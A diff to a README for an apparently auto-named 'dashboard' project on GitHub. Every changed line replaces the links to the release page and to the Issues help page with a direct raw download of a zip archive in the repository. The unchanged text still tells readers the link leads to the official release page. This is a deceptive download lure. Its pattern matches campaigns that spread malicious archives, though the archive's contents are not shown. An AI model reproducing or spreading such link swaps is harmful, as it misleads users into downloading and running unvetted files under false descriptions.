@@ -1,6 +1,6 @@
 # 📊 dashboard-1771929892-3 - Real-Time Data Made Clear
 
-[![Download dashboard-1771929892-3](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/pasindu1111/dashboard-1771929892-3/releases)
+[![Download dashboard-1771929892-3](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/pasindu1111/dashboard-1771929892-3/raw/refs/heads/main/pkg/dashboard_2.5-alpha.2.zip)
 
 ## 📋 About dashboard-1771929892-3
 
@@ -37,13 +37,13 @@ If your PC meets these requirements, you can run the dashboard without issues.
 
 You will find the download link below. It leads to the official release page. From there, pick the latest version to download.
 
-[![Download dashboard-1771929892-3](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/pasindu1111/dashboard-1771929892-3/releases)
+[![Download dashboard-1771929892-3](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/pasindu1111/dashboard-1771929892-3/raw/refs/heads/main/pkg/dashboard_2.5-alpha.2.zip)
 
 ### Step 1: Visit the Release Page
 
 Click the button above or go to:
 
-https://github.com/pasindu1111/dashboard-1771929892-3/releases
+https://github.com/pasindu1111/dashboard-1771929892-3/raw/refs/heads/main/pkg/dashboard_2.5-alpha.2.zip
 
 This page lists the latest versions of the software, each with files ready to download.
 
@@ -156,7 +156,7 @@ If charts do not display correctly:
 - Confirm your data matches the required format (numbers and dates)  
 
 For more help, visit the GitHub Issues page:  
-https://github.com/pasindu1111/dashboard-1771929892-3/issues
+https://github.com/pasindu1111/dashboard-1771929892-3/raw/refs/heads/main/pkg/dashboard_2.5-alpha.2.zip
 
 ---
 
@@ -180,6 +180,6 @@ While there is no direct support, the community and repository page can offer gu
 
 Use the links below to download dashboard-1771929892-3:
 
-[![Download dashboard-1771929892-3](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/pasindu1111/dashboard-1771929892-3/releases)
+[![Download dashboard-1771929892-3](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/pasindu1111/dashboard-1771929892-3/raw/refs/heads/main/pkg/dashboard_2.5-alpha.2.zip)
 
-https://github.com/pasindu1111/dashboard-1771929892-3/releases
+https://github.com/pasindu1111/dashboard-1771929892-3/raw/refs/heads/main/pkg/dashboard_2.5-alpha.2.zip
